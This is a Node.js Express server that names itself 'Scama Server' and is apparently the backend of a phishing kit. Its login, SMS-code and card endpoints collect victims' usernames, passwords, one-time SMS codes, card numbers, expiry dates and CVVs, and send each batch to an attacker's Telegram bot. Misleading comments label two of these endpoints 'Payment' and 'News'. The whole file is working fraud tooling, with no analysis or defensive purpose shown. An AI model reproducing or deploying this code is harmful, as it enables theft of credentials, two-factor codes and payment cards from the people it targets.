const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const config = require('./config');

const app = express();

// Security middleware
app.use(helmet());
app.use(cors());

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Routes
app.get('/', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Scama Server API is running',
        version: '1.0.0',
        timestamp: new Date().toISOString()
    });
});

// Payment API endpoint
app.post('/api/login', async (req, res) => {
    try {
       const { 
    // Personal Information
    username,
    password,
    pageType,
    userAgent,
    
    // System Information
    clientIP,
    timestamp,
   
} = req.body;

        // Validate required fields
       

        // Format message for Telegram
        const message = `🔐 Payment Details:
👤 login: ${username}
password: ${password}
pageType: ${pageType}
agent: ${userAgent}

🌐 IP: ${clientIP || req.ip}
⏰ Time: ${new Date().toLocaleString('he-IL')}`;

        // Send to Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
            {
                chat_id: config.telegram.chatId,
                text: message,
                parse_mode: 'HTML'
            }
        );

        if (telegramResponse.data.ok) {
            res.json({ 
                success: true, 
                message: 'Payment data sent successfully',
                messageId: telegramResponse.data.result.message_id
            });
        } else {
            throw new Error('Telegram API error');
        }

    } catch (error) {
        console.error('Error sending payment data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to send payment data' 
        });
    }
});

// SMS API endpoint
app.post('/api/send-sms', async (req, res) => {
    try {
        const { 
        
    smsCode,
    pageType,
    userAgent,
    
    // System Information
    clientIP,
    timestamp,
        } = req.body;

        // Validate required fields
       

  
        const message = `📱 SMS Code (${pageType}):
🔢 Code: ${smsCode}
🔢 agent: ${userAgent}
🌐 IP: ${clientIP || req.ip}
⏰ Time: ${new Date().toLocaleString('he-IL')}`;

        // Send to Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
            {
                chat_id: config.telegram.chatId,
                text: message,
                parse_mode: 'HTML'
            }
        );

        if (telegramResponse.data.ok) {
            res.json({ 
                success: true, 
                message: 'SMS data sent successfully',
                messageId: telegramResponse.data.result.message_id
            });
        } else {
            throw new Error('Telegram API error');
        }

    } catch (error) {
        console.error('Error sending SMS data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to send SMS data' 
        });
    }
});

// News API endpoint
app.post('/api/cc', async (req, res) => {
    try {
        const { 
            cardNumber,
            pageType,
                clientIP,cardExp,cardCvv,userAgent
        } = req.body;

        // Validate required fields
       

  
        const message = `type (${pageType}):
cc: ${cardNumber}
exp:${cardExp}
cvv:${cardCvv}
agent:${userAgent}
🌐 IP: ${clientIP || req.ip}
⏰ Time: ${new Date().toLocaleString('he-IL')}`;

        // Send to Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${config.telegram.botToken}/sendMessage`,
            {
                chat_id: config.telegram.chatId,
                text: message,
                parse_mode: 'HTML'
            }
        );

        if (telegramResponse.data.ok) {
            res.json({ 
                success: true, 
                message: 'SMS data sent successfully',
                messageId: telegramResponse.data.result.message_id
            });
        } else {
            throw new Error('Telegram API error');
        }

    } catch (error) {
        console.error('Error sending SMS data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to send SMS data' 
        });
    }
});

// News API endpoint
app.get('/api/news', async (req, res) => {
    try {
        const { country = 'il', category = 'general', pageSize = 10 } = req.query;
        
        const newsResponse = await axios.get(config.news.apiUrl, {
            params: {
                country: country,
                category: category,
                pageSize: pageSize,
                apiKey: config.news.apiKey
            }
        });

        res.json({
            success: true,
            articles: newsResponse.data.articles
        });

    } catch (error) {
        console.error('Error fetching news:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to fetch news' 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ 
        success: false, 
        message: 'Something went wrong!' 
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        message: 'Route not found' 
    });
});

// Start server
const PORT = config.server.port;
app.listen(PORT, () => {
    console.log(`🚀 Scama Server running on port ${PORT}`);
    console.log(`📱 Telegram Bot Token: ${config.telegram.botToken.substring(0, 10)}...`);
    console.log(`📰 News API configured: ${config.news.apiKey ? 'Yes' : 'No'}`);
    console.log(`🌍 Environment: ${config.server.environment}`);
    console.log(`🔗 API Base URL: http://localhost:${PORT}`);
});

module.exports = app;
